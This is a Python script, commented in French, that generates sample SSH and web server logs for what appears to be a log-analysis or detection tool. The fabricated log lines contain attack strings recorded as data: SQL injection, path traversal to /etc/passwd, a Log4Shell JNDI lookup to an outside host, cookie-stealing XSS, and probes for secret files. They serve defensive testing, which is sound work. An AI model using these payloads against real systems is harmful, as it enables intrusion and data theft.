"""Génère les journaux d'exemple de samples/.

Toutes les adresses IP proviennent des plages réservées à la documentation (RFC 5737) :
192.0.2.0/24, 198.51.100.0/24 et 203.0.113.0/24. Elles n'appartiennent à personne.

Usage : python scripts/generate_samples.py
"""
from __future__ import annotations

import random
from datetime import datetime, timedelta
from pathlib import Path

OUT = Path(__file__).resolve().parent.parent / "samples"
DAY = datetime(2026, 10, 24)
FIREFOX = "Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0"
random.seed(42)


def syslog(ts: datetime, proc: str, msg: str) -> tuple[datetime, str]:
    pid = random.randint(1000, 9999)
    return ts, f"{ts:%b} {ts.day:>2} {ts:%H:%M:%S} web01 {proc}[{pid}]: {msg}"


def auth_log() -> str:
    lines = []
    t = DAY.replace(hour=8)
    for i in range(6):  # bruit de fond
        lines.append(syslog(t + timedelta(minutes=10 * i), "CRON",
                            "pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)"))

    # Connexion légitime par clé
    lines.append(syslog(DAY.replace(hour=9, minute=12), "sshd",
                        "Accepted publickey for romaric from 192.0.2.10 port 50122 ssh2: ED25519 SHA256:k3y"))

    # Force brute réussie sur le compte « deploy »
    t = DAY.replace(hour=10, minute=15, second=2)
    for i in range(12):
        user = "root" if i < 3 else "deploy"
        port = 52000 + i
        lines.append(syslog(t, "sshd", f"Failed password for {user} from 203.0.113.45 port {port} ssh2"))
        t += timedelta(seconds=random.randint(8, 15))
    lines.append(syslog(t + timedelta(seconds=9), "sshd",
                        "Accepted password for deploy from 203.0.113.45 port 52031 ssh2"))

    # Pulvérisation : un essai par compte courant
    t = DAY.replace(hour=11, minute=30)
    for user in ["admin", "test", "oracle", "postgres", "ubuntu", "guest", "ftpuser", "pi"]:
        port = random.randint(30000, 60000)
        lines.append(syslog(t, "sshd", f"Invalid user {user} from 198.51.100.23 port {port}"))
        lines.append(syslog(t + timedelta(seconds=2), "sshd",
                            f"Failed password for invalid user {user} from 198.51.100.23 port {port} ssh2"))
        lines.append(syslog(t + timedelta(seconds=3), "sshd",
                            f"Connection closed by invalid user {user} 198.51.100.23 port {port} [preauth]"))
        t += timedelta(seconds=40)

    # Connexion root directe
    lines.append(syslog(DAY.replace(hour=13, minute=5), "sshd",
                        "Accepted password for root from 192.0.2.50 port 41822 ssh2"))

    # Échecs sudo
    lines.append(syslog(DAY.replace(hour=14, minute=20), "sudo",
                        "stagiaire : 3 incorrect password attempts ; TTY=pts/1 ; PWD=/home/stagiaire ; "
                        "USER=root ; COMMAND=/usr/bin/cat /etc/shadow"))

    # Faute de frappe isolée : ne doit déclencher aucune alerte
    t = DAY.replace(hour=16)
    lines.append(syslog(t, "sshd", "Failed password for romaric from 192.0.2.10 port 50544 ssh2"))
    lines.append(syslog(t + timedelta(seconds=6), "sshd",
                        "Accepted password for romaric from 192.0.2.10 port 50544 ssh2"))
    return "\n".join(line for _, line in sorted(lines)) + "\n"


def access(ts: datetime, ip: str, path: str, status: int, ua: str, method: str = "GET"):
    size = random.randint(200, 9000) if status == 200 else random.randint(150, 600)
    return ts, (f'{ip} - - [{ts:%d/%b/%Y:%H:%M:%S} +0000] "{method} {path} HTTP/1.1" '
                f'{status} {size} "-" "{ua}"')


def access_log() -> str:
    lines = []
    pages = ["/", "/a-propos", "/services", "/contact", "/static/app.css", "/static/app.js",
             "/blog/securiser-ssh", "/favicon.ico"]
    for i in range(45):  # trafic normal
        ts = DAY.replace(hour=9) + timedelta(minutes=random.randint(0, 600), seconds=random.randint(0, 59))
        lines.append(access(ts, f"192.0.2.{random.choice([10, 11, 12, 13])}", random.choice(pages), 200, FIREFOX))

    # sqlmap : injection SQL, une requête reçoit 200
    t = DAY.replace(hour=12, minute=2)
    ua = "sqlmap/1.8.4#stable (https://sqlmap.org)"
    for path, status in [
        ("/produits.php?id=1", 200),
        ("/produits.php?id=1%27%20OR%20%271%27%3D%271", 200),
        ("/produits.php?id=1%20UNION%20SELECT%20username,password%20FROM%20users--", 500),
        ("/produits.php?id=1%20AND%20SLEEP(5)", 200),
    ]:
        lines.append(access(t, "203.0.113.77", path, status, ua))
        t += timedelta(seconds=3)

    # Nikto : énumération de fichiers sensibles
    t = DAY.replace(hour=12, minute=40)
    ua = "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000001)"
    probes = ["/.env", "/.git/config", "/phpmyadmin/", "/wp-login.php", "/backup.sql", "/db.bak",
              "/server-status", "/.htpasswd", "/cgi-bin/test.cgi", "/xmlrpc.php"]
    for path in probes:
        lines.append(access(t, "198.51.100.9", path, 403 if path == "/server-status" else 404, ua))
        t += timedelta(seconds=2)
    for i in range(22):
        lines.append(access(t, "198.51.100.9", f"/admin{i}.php", 404, ua))
        t += timedelta(seconds=2)

    # Traversée de répertoires
    t = DAY.replace(hour=14, minute=10)
    lines.append(access(t, "203.0.113.140", "/telecharger?fichier=../../../../etc/passwd", 400, FIREFOX))
    lines.append(access(t + timedelta(seconds=4), "203.0.113.140",
                        "/static/..%2f..%2f..%2fetc%2fpasswd", 404, FIREFOX))

    # Log4Shell dans le User-Agent
    lines.append(access(DAY.replace(hour=15, minute=33), "192.0.2.200", "/", 200,
                        "${jndi:ldap://198.51.100.66:1389/Exploit}"))

    # XSS réfléchi
    lines.append(access(DAY.replace(hour=17, minute=8), "198.51.100.31",
                        "/recherche?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E", 200, FIREFOX))
    return "\n".join(line for _, line in sorted(lines)) + "\n"


if __name__ == "__main__":
    OUT.mkdir(exist_ok=True)
    (OUT / "auth.log").write_text(auth_log(), encoding="utf-8")
    (OUT / "access.log").write_text(access_log(), encoding="utf-8")
    print(f"Exemples écrits dans {OUT}")
